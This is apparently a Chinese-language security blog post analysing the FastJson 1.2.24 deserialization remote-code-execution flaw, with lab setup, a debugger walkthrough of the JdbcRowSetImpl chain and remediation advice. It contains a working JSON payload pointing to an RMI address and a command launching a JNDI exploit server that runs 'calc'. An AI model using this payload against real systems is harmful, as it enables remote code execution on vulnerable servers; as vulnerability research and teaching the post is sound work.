---
title: 代码审计 | FastJson 1.2.24 反序列化 RCE 漏洞分析
cover: https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image5.png
categories:
  - [代码审计, fastjson]
tags:
  - 代码审计
  - FastJson
  - Java
  - RCE
abbrlink: 3035988a
date: 2026-03-24 14:00:00
---

> 本文从环境搭建出发，一步一步分析 FastJson 反序列化 RCE 的完整利用链，并结合调试断点深入分析底层代码执行逻辑。

---

## 目录

1. [漏洞背景](#一漏洞背景)
2. [环境准备](#二环境准备)
3. [搭建 Maven 项目](#三搭建-maven-项目)
4. [FastJson @type 机制初探（User 例子）](#四fastjson-type-机制初探user-例子)
5. [parseObject 两种调用方式的本质区别](#五parseobject-两种调用方式的本质区别)
6. [PoC 复现：JdbcRowSetImpl 利用链](#六poc-复现jdbcrowsetimpl-利用链)
7. [底层代码调试分析](#七底层代码调试分析)
8. [完整漏洞链路总结](#八完整漏洞链路总结)
9. [修复建议](#九修复建议)

---

## 一、漏洞背景

FastJson 是阿里巴巴开源的高性能 JSON 解析库，广泛用于 Java 后端项目。

**漏洞版本：≤ 1.2.24**

核心原因是 `@type` 字段允许任意类加载，攻击者可以通过在 JSON 数据中指定恶意类，触发该类的危险方法，最终实现远程代码执行（RCE）。

简单来说，FastJson 在解析 JSON 的时候，如果发现有 `@type` 这个字段，它会把里面的值当作类名，直接去加载这个类——而且没有任何白名单限制。这个设计在 1.2.24 及以下版本是完全开放的，给了攻击者可乘之机。

---

## 二、环境准备

**测试环境：**

- JDK：`java 8u64`

  > ⚠️ 这里必须用低版本 JDK，原因很关键：从 JDK 8u191 开始，Java 对 JNDI 远程类加载做了限制（`com.sun.jndi.rmi.object.trustURLCodebase` 默认设为 `false`），也就是说高版本 JDK 直接阻断了通过 RMI 加载远程恶意类这条路。所以要复现这个漏洞，必须用 8u191 以下的版本。

- FastJson 版本：`1.2.24`

**相关资源：**

- JNDI 注入利用工具：`JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar`
- FastJson 1.2.24 依赖：https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.24/
- FastJson 1.2.27（对比参考）：https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.27/

---

## 三、搭建 Maven 项目

### 第一步：建 Maven 项目

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image1.png)

### 第二步：添加 FastJson 依赖

在 `pom.xml` 的 `</properties>` 后面加入以下依赖：

```xml
<dependencies>
    <dependency>
        <groupId>com.alibaba</groupId>
        <artifactId>fastjson</artifactId>
        <version>1.2.24</version>
    </dependency>
</dependencies>
```

### 第三步：下载依赖

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image2.png)

依赖下载成功后可以看到：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image3.png)

---

## 四、FastJson @type 机制初探（User 例子）

在正式打漏洞之前，先搞懂 `@type` 到底是干什么的，用一个简单的自定义类来演示。

### 4.1 创建 User 类

新建文件 `src/main/java/org/example/User.java`：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image6.png)

代码内容如下：

```java
package org.example;

public class User {
    private String name;
    private int age;
    private String gender;

    public String getName() {
        System.out.println("getName");
        return name;
    }

    public void setName(String name) {
        this.name = name;
        System.out.println("setName");
    }

    public int getAge() {
        System.out.println("getAge");
        return age;
    }

    public void setAge(int age) {
        this.age = age;
        System.out.println("setAge");
    }

    public String getGender() {
        System.out.println("getGender");
        return gender;
    }

    public void setGender(String gender) {
        this.gender = gender;
        System.out.println("setGender");
    }
}
```

### 4.2 修改 Main.java 测试解析

在 `src/main/java/org/example/Main.java` 中修改代码：

```java
String Test = "{\"@type\":\"org.example.User\"," +
              "\"name\":\"wrold\"," +
              "\"age\":18}";

JSONObject date = JSON.parseObject(Test);
System.out.println(date);
```

### 4.3 运行结果

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image7.png)

可以看到：
- `@type` 指向的是我们自己创建的类文件
- JSON 数据包含了 `name` 和 `age` 两个参数
- 在运行结果里，触发了 `setName`、`setAge`、`getAge`、`getName`
- 虽然没有定义 `gender` 参数，但仍然触发了 `getGender`

---

## 五、parseObject 两种调用方式的本质区别

如果把：

```java
JSONObject date = JSON.parseObject(Test);
```

改成：

```java
User user = JSON.parseObject(test, User.class);
```

运行结果就不一样了：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image8.png)

`JSON.parseObject(test, User.class)` 只触发了 setter，没有触发任何 getter。

**两种调用方式的本质区别：**

| 调用方式 | 触发方法 | 返回类型 |
|---|---|---|
| `JSON.parseObject(test)` | setter + getter | JSONObject |
| `JSON.parseObject(test, User.class)` | 只有 setter | User 对象 |

**这个区别在漏洞利用里非常关键：**

- **setter 型利用链** → 两种调用方式都能触发，`JdbcRowSetImpl` 就是这种
- **getter 型利用链** → 只有 `parseObject(test)` 无类型版本才能触发，`TemplatesImpl` 的 `getOutputProperties` 就是典型

---

## 六、PoC 复现：JdbcRowSetImpl 利用链

### 6.1 为什么用 JdbcRowSetImpl？

`JdbcRowSetImpl` 是 JDK 自带的 JDBC 行集实现类。它的 `setDataSourceName` 和 `setAutoCommit` 方法组合可以触发 JNDI 查询，是 FastJson 漏洞利用中最经典的 **setter 型利用类**——不需要依赖任何第三方库，JDK 自带，通用性极强。

利用逻辑很简单：
1. `setDataSourceName` → 存入 RMI 地址
2. `setAutoCommit` → 触发 JNDI lookup，连接恶意 RMI 服务
3. RMI 服务返回恶意类 → 加载执行 → RCE

### 6.2 编写 Payload

在 `src/main/java/org/example/Main.java` 中添加代码：

```java
package org.example;

import com.alibaba.fastjson.JSON;

public class Main {
    public static void main(String[] args) {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                         "\"dataSourceName\":\"rmi://127.0.0.1:1099/exploit\"," +
                         "\"autoCommit\":true}";
        JSON.parseObject(payload);
    }
}
```

### 6.3 启动 JNDI 服务

```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc" -A "172.16.250.1"
```

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image4.png)

### 6.4 修改 Payload 地址

把 payload 里的地址换成 JNDI 工具生成的对应地址：

```json
{
    "@type" : "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName" : "rmi://172.16.250.1:1099/4in98t",
    "autoCommit" : true
}
```

### 6.5 成功弹出计算器

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image5.png)

**PoC 验证成功！**

---

## 七、底层代码调试分析

光跑通还不够，接下来打断点进去看看 FastJson 底层到底干了什么。

### 7.1 入口分析

打断点进入函数：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image9.png)

直接看到用了 `parse()`：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image10.png)

所以 `JSON.parse(payload)` 同样能触发漏洞，不一定要用 `parseObject`。

示例：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260324195228667.png)

### 7.2 @type 字段的识别

进入 `com/alibaba/fastjson/parser/DefaultJSONParser.java`，发现一个判断语句，判断是否有 `@type` 的值：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image12.png)

判断成功后进入处理逻辑：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image13.png)

`com.sun.rowset.JdbcRowSetImpl` 被提取出来赋值给了 `typeName`：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image14.png)

### 7.3 任意类加载：TypeUtils.loadClass

接着触发了这个函数：

```java
TypeUtils.loadClass(typeName, config.getDefaultClassLoader());
```

进去看看，一路的 if 语句都没有成立，最后停到了这里：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image15.png)

```
className: "com.sun.rowset.JdbcRowSetImpl"  ← @type 的值
clazz:     "class com.sun.rowset.JdbcRowSetImpl"  ← 字符串成功变成 Class 对象
```

**这就是漏洞的根源**：FastJson 解析 JSON 时，如果发现 `@type` 字段，会调用 `TypeUtils.loadClass()` 把字符串值转成 Class 对象，然后实例化该类并通过反射调用对应的 setter 方法赋值——**任意类都可以被实例化，没有任何限制**。

### 7.4 找到 Deserializer

继续往下执行，发现下面有一个 Deserializer，对象就是 `@type` 指定的 `com.sun.rowset.JdbcRowSetImpl`：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image16.png)

### 7.5 逐步跟踪 setter 调用

与其一步一步跟链，不如直接在关键 setter/getter 上打断点，效率更高。需要关注的方法：

- `setDataSourceName`
- `getDataSourceName`
- `setAutoCommit`
- `getAutoCommit`

> 搜索 `setDataSourceName` / `getDataSourceName` 直接搜索搜不到函数，只能找到接口和定义。要找 `setAutoCommit` / `getAutoCommit`，需要用 **双击 Shift** 搜索类名 `JdbcRowSetImpl`，定位到 `JdbcRowSetImpl.class` 后再找对应方法。

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260324195304383.png)

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260324195318140.png)

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260324195333100.png)

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260324195339115.png)

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image21.png)

### 7.6 setDataSourceName 执行过程

再跑一遍调试，进入反序列化函数后，直接跳到下一个断点，到达了 `setDataSourceName`：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image22.png)

`setDataSourceName` 被调用，传入 RMI 地址 `rmi://172.16.250.1:1099/4in98t`，但此时 `dataSource` 为空，进入 else 判断：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image23.png)

`getDataSourceName` 被调用，但 `dataSource` 为空：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image24.png)

父类 `setDataSourceName` 执行 `dataSource = name`，把 RMI 地址真正存进去。

接下来执行了这个方法：

```java
method.invoke(object, value);
```

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image25.png)

**它做的事：**

`method.invoke(object, value)` 是 Java 反射调用，等价于直接调用：

```java
// 反射调用 method.invoke(object, value);
// 等价于直接调用：
object.setDataSourceName("rmi://172.16.250.1:1099/xxx");
object.setAutoCommit(true);
```

有两个重要的参数：

- `rmi://172.16.250.1:1099/4in98t`
- `com.sun.rowset.JdbcRowSetImpl`

### 7.7 setAutoCommit 触发 JNDI lookup

继续：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image26.png)

进入 `setAutoCommit`，`conn` 为 `null`，走 else 分支：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image27.png)

执行 `this.conn = this.connect()`：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image28.png)

进入 `connect()`，从 `getDataSourceName` 取值：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image29.png)

`getDataSourceName` 再次被调用，这次返回了 RMI 地址，不为空，正常执行 try 里面的内容：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/fastjson_image30.png)

里面执行了 `lookup()`，就是 **JNDI lookup**，参数就是 RMI 地址。

连接恶意 RMI 服务，加载远程恶意类，**RCE 触发**。

---

## 八、完整漏洞链路总结

```
JSON.parseObject(payload)
    → @type 加载 JdbcRowSetImpl 类
    → setDataSourceName("rmi://172.16.250.1:1099/4in98t")  ← 存入 RMI 地址
    → setAutoCommit(true)
        → connect()
            → JNDI lookup("rmi://172.16.250.1:1099/4in98t")  ← 连接恶意 RMI 服务
                → 加载远程恶意类
                    → RCE
```
### FastJson RCE 完整流程

**第一步：攻击者构造恶意 JSON**

攻击者在 JSON 数据里塞一个 `@type` 字段，值是 `com.sun.rowset.JdbcRowSetImpl`，同时带上 `dataSourceName`（填自己控制的 RMI 服务地址）和 `autoCommit: true`。这段 JSON 被发送到目标服务器上任何会调用 `JSON.parseObject()` 的接口。

**第二步：FastJson 识别 @type，加载任意类**

目标服务器拿到这段 JSON 开始解析，FastJson 在 `DefaultJSONParser` 里发现了 `@type` 字段，于是调用 `TypeUtils.loadClass()` 把字符串 `"com.sun.rowset.JdbcRowSetImpl"` 直接转成 Class 对象并实例化。这一步是整个漏洞的根源——1.2.24 及以下没有任何白名单限制，传什么类名就加载什么类。

**第三步：反射调用 setter，存入 RMI 地址**

类加载完成后，FastJson 通过 Java 反射机制依次调用对应字段的 setter 方法。先调 `setDataSourceName()`，把攻击者的 RMI 地址存进对象里，再调 `setAutoCommit(true)`。

**第四步：setAutoCommit 触发 JNDI lookup**

`setAutoCommit` 执行时发现数据库连接 `conn` 是空的，于是调 `connect()` 去建立连接。`connect()` 内部取出刚才存进去的 RMI 地址，执行 `JNDI lookup()`，主动向攻击者控制的 RMI 服务器发起请求。

**第五步：RMI 服务返回恶意类，目标服务器执行**

攻击者的 RMI 服务器收到请求后，返回一个远程恶意类（比如弹计算器、反弹 shell 等）。目标服务器加载并执行这个类，RCE 完成。

---

## 九、修复建议

### 方法一：升级版本（推荐）

升级到 **1.2.25 及以上版本**，FastJson 从 1.2.25 开始引入了 `checkAutoType` 机制，`@type` 的自动类型识别**默认关闭**，同时内置了一份危险类黑名单。

### 方法二：手动关闭 AutoType（如果无法升级）

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(false);
```

### 方法三：升级 JDK

将 JDK 升级到 **8u191 及以上**，可以阻断 JNDI 远程类加载这条路，对基于 RMI/LDAP 的利用链有缓解效果。但注意这不是根本修复，仍建议同时升级 FastJson。

### 其他缓解措施

- 不要在公网暴露含有 FastJson 反序列化处理的接口
- 对外部输入进行严格过滤，避免将不可信数据直接传入 `JSON.parseObject()`
- 定期扫描项目依赖，关注 FastJson 等高频漏洞组件的安全公告

---

> **参考资料**
>
> - FastJson 官方 GitHub：https://github.com/alibaba/fastjson
> - Maven 中央仓库 FastJson 1.2.24：https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.24/
